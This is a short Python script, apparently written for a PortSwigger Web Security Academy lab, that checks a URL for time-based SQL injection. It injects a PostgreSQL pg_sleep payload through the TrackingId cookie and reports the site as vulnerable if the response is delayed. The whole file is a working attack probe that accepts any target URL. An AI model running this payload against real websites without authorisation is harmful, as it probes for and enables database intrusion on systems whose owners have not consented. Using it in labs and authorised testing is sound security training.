import requests
import sys


def time_based_sqli_check(url):
    encoded_payload = requests.utils.quote("' || (SELECT pg_sleep(10))--")
    response = requests.get(url, cookies={'TrackingId': encoded_payload})

    if response.status_code != 200:
        print("Request Failed, please check your url and try again.")
    elif response.elapsed.total_seconds() > 10:
        print("This website is vulnerable to time based SQL injection.")
    else:
        print("This website is not vulnerable to time based SQL injection.")


def main():
    try:
        url = sys.argv[1]
        print("Testing for time based SQL injection...")
        time_based_sqli_check(url)

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")


if __name__ == "__main__":
    main()
